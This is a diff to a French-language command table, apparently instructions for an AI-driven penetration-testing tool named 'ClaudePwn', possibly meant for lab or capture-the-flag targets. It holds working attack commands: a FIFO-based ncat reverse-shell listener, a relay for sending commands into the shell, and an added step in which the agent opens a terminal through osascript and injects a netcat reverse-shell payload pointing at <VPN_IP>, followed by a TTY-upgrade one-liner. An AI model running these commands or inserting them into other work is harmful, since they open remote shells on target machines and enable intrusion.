@@ -126,7 +126,7 @@ Pour les ports non-standard (8080, 3000, etc.), ajoute le port : \`http://${doma
 | **shell ssh <user>** | Connexion SSH | ssh <user>@${ip} (avec password ou clé) |
 | **shell reverse <port>** | Écouter un reverse shell via FIFO | rm -f /tmp/shell_in /tmp/shell_out; mkfifo /tmp/shell_in; tail -f /tmp/shell_in | ncat -lvnp <port> -k > /tmp/shell_out 2>&1 & echo "Listener started on port <port> (PID: $!)" |
 | **shell cmd <commande>** | Envoyer une commande au reverse shell | echo "<commande>" > /tmp/shell_in; sleep 1; cat /tmp/shell_out |
-| **shell upgrade** | Upgrade shell → interactif | Dis à l'utilisateur d'ouvrir un terminal séparé et de suivre ces étapes : 1) \`ncat -lvnp <nouveau port>\` 2) ClaudePwn trigger un nouveau reverse shell vers ce port 3) Dans le terminal ncat, taper : \`python3 -c "import pty;pty.spawn('/bin/bash')"\` puis Ctrl+Z, \`stty raw -echo; fg\`, \`export TERM=xterm\`. Le shell sera alors pleinement interactif (tab, su, vi, etc.). |
+| **shell upgrade** | Ouvrir un shell interactif dans un nouveau terminal | 1) Ouvre un nouveau terminal avec le listener : \`osascript -e 'tell app "Terminal" to do script "ncat -lvnp 9001"'\` 2) Trigger un nouveau reverse shell vers ce port via le FIFO : \`echo "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc <VPN_IP> 9001 >/tmp/g" > /tmp/shell_in\` 3) Affiche les instructions TTY upgrade à l'utilisateur : \`python3 -c "import pty;pty.spawn('/bin/bash')"\` puis Ctrl+Z, \`stty raw -echo; fg\`, \`export TERM=xterm\` |
 
 ### crack — Cracking
 | Commande | Actions | Outils |
